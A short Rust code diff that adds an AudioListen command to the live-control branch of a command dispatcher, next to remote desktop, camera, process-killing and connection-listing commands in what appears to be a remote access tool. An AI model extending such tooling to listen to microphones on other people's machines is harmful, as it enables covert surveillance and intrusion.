@@ -47,7 +47,7 @@ pub fn handle_command(command: &CommandKind, payload: &str, gui_mode: bool) -> C
         | CommandKind::ActiveConnections
         | CommandKind::PerformanceMonitor
         | CommandKind::KillTargetProcess => crate::remote_management::handle(command, payload),
-        CommandKind::RemoteDesktop | CommandKind::Camera => {
+        CommandKind::RemoteDesktop | CommandKind::Camera | CommandKind::AudioListen => {
             crate::live_control::handle(command, payload)
         }
         CommandKind::MessageBox
